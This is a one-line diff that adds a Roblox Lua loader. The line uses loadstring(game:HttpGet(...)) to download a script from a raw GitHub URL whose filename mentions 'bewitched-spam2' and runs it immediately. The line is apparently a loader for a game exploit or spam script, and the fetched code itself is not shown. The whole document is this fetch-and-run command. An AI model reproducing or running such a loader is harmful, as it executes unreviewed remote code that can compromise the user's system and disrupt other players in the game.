@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/bewitched-spam2-a7jiw0cjgecv6z.lua"))()
